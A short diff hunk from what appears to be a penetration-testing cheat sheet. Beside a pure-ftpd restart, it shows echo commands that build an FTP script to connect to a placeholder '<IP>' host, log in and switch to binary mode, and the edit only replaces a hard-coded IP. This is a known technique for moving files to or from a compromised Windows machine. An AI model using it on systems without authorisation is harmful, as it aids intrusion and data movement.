@@ -49,7 +49,7 @@ sudo systemctl restart pure-ftpd
 
 -> Transfer
 ```powershell
-echo open 192.168.0.20 21> ftp.txt
+echo open <IP> 21> ftp.txt
 echo USER user>> ftp.txt
 echo password>> ftp.txt
 echo bin >> ftp.txt
